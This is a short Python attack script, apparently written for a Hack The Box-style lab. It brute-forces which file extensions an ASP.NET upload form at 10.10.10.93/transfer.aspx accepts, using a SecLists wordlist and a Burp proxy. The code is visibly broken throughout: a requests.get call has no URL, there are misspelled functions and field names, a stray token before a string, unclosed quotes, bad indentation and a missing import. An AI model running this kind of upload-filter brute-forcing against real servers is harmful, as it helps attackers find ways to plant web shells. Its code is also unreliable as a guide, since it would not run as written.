```python 

#!/usr/bin/python3

from pwn import *
import signal, time, pdb, sys, requests

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

#Ctrl+C
signal.signal(signal.SIGINT, def_handler)

#variables globales
transfer_url = "http://10.10.10.93/transfer.aspx"
burp = {'http': 'http://127.0.0.1:8080'}

def uploadFile(extension):

    s = requests.session()
    r = requests.get()

    viewState = re.fidall(r'id="__WIEWSTATE" value="(.*?)"', r.text)[0]
    eventValidation = re.findall(r.'id="__EVENTVALIDATION" value="(.*?)"', r.text)[0]

    post_data = {
        '__VIEWSTATE': viewState,
        '__EVENTVALIDATION': eventValidation,
        '__btnUpload': 'Upload'

        }

        fileUploaded = {'FileUpload': ('Prueba%s' % extension, Esto es una prueba')}

        r = s.post(transfer_url, data=post_data, files=fileUploaded, proxies=burp)

        if "Invalid File. Please try again" not in r.text:
            log.info("La extension %s es valida" % extension)

if __name__ == '__main__':

    f = open("/usr/share/seclists/Discovery/Web-Content/raft-medium-extensions-lowercase.txt", "rb")

    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando ataque de fierza bruta")

    time.sleep(2)

    for extension in f.readlines():
        extension = extension.decode().strip()
        p1.status("Probando con la extension %s" % extension)
        uploadFile(extension)
